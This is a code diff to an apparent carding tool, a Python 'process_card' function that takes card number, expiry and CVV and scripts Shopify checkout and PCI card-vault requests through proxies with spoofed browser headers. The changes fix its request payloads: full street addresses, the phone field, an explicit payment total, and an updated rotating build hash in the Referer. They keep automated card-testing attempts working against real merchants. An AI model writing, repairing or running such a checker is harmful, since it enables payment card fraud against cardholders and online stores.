@@ -1482,7 +1482,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     'delivery': {
                         'deliveryLines': [{
                             'destination': {
-                                'partialStreetAddress': {
+                                'streetAddress': {
                                     'address1': street, 'address2': address2, 'city': city,
                                     'countryCode': country_code, 'postalCode': s_zip,
                                     'firstName': firstName, 'lastName': lastName,
@@ -1494,7 +1494,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                     'estimatedTimeInTransit': {'any': True},
                                     'shipments': {'any': True}
                                 },
-                                'options': {}
+                                'options': {'phone': phone}
                             },
                             'targetMerchandiseLines': {'any': True},
                             'deliveryMethodTypes': ['SHIPPING'],
@@ -1502,7 +1502,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                             'destinationChanged': True
                         }],
                         'noDeliveryRequired': [],
-                        'useProgressiveRates': False,
+                        'useProgressiveRates': True,
                         'prefetchShippingRatesStrategy': None,
                         'supportsSplitShipping': True
                     },
@@ -1530,8 +1530,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         'paymentLines': [],
                         'billingAddress': {
                             'streetAddress': {
-                                'address1': '', 'city': '', 'countryCode': country_code,
-                                'lastName': '', 'zoneCode': state, 'phone': ''
+                                'address1': '', 'address2': '', 'city': '', 'countryCode': country_code,
+                                'postalCode': '', 'firstName': '', 'lastName': '', 'zoneCode': state, 'phone': ''
                             }
                         }
                     },
@@ -1912,7 +1912,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     'handle': delivery_strategy if delivery_strategy else '',
                     'customDeliveryRate': False
                 },
-                'options': {}
+                'options': {'phone': phone}
             }
             json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
                 'lines': [{'stableId': stableId or '1'}]
@@ -1921,6 +1921,15 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'value': {'amount': str(shipping_amount), 'currencyCode': currency}
             }
             json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
+            # FIX: Replace partialStreetAddress with streetAddress to match Submit
+            json_data['variables']['delivery']['deliveryLines'][0]['destination'] = {
+                'streetAddress': {
+                    'address1': street, 'address2': address2, 'city': city,
+                    'countryCode': country_code, 'postalCode': s_zip,
+                    'firstName': firstName, 'lastName': lastName,
+                    'zoneCode': state, 'phone': phone
+                }
+            }
             json_data['variables']['payment']['billingAddress'] = {
                 'streetAddress': {
                     'address1': street, 'address2': address2, 'city': city,
@@ -2061,7 +2070,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'Origin': 'https://checkout.pci.shopifyinc.com',
                 # FIX: Build hash `/a8e4a94/` was outdated — Shopify rotates these.
                 # Use the dynamic hash fetched from checkout page, or fallback to latest known hash.
-                'Referer': f'https://checkout.pci.shopifyinc.com/build/{pci_build_hash}/number-ltr.html?identifier=&locationURL={quote(checkout_url, safe="")}',
+                'Referer': f'https://checkout.pci.shopifyinc.com/build/{pci_build_hash}/number-ltr.html?identifier={attempt_token}&locationURL={quote(checkout_url, safe="")}',
                 'User-Agent': hints['ua'],
                 'sec-ch-ua': hints['sec_ch_ua'],
                 'sec-ch-ua-full-version-list': hints['sec_ch_ua_full'],
@@ -2182,7 +2191,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         }]
                     },
                     'payment': {
-                        'totalAmount': {'any': True},
+                        'totalAmount': {'value': {'amount': str(running_total), 'currencyCode': currency}},
                         'paymentLines': [{
                             'paymentMethod': {
                                 'directPaymentMethod': {
@@ -2197,7 +2206,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                                             'phone': phone
                                         }
                                     },
-                                    'cardSource': None
+                                    'cardSource': 'UNKNOWN'
                                 }
                             },
                             'amount': {
